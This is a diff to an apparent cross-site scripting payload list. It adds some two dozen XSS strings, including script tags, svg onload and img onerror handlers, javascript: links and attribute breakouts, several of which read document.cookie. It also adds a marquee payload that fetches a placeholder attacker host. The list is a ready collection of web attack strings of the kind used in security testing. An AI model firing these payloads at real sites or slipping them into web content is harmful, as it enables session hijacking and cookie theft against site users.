@@ -1,3 +1,17 @@
+<marquee onstart="fetch('http://YOURIPGOESHERE/information');">
+<audio src=; onerror=javascript:alert(1);></audio>
+'%3balert(42)%2f%2f
+<svg/onload=alert(1)>
+<svg/onload=alert(document.cookie)>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert('document.cookie')</script>
+<script>alert("document.cookie")</script>
+"><h1test</h1>
+'+alert(1)+'
+"onmouseover="alert(1)
+<img src=’’ onerror=”alert(‘xss’)” />
+<a href="javascript:alert(1)">TEST</a>
 '-alert(1)-'
 '/alert(1)//
 \'-alert(1)//
@@ -8,9 +22,7 @@
 \'}alert(1)%0A{'//
 /alert(1)//\
 }/alert(1)//\
-JS Object – Nested Array
 }]}/alert(1)//\
-JS Object – Nested Function
 }}}/alert(1)//\
 ${alert(1)}
 Notification.requestPermission(x=>{new(Notification)(1)})new(Notification)(1)
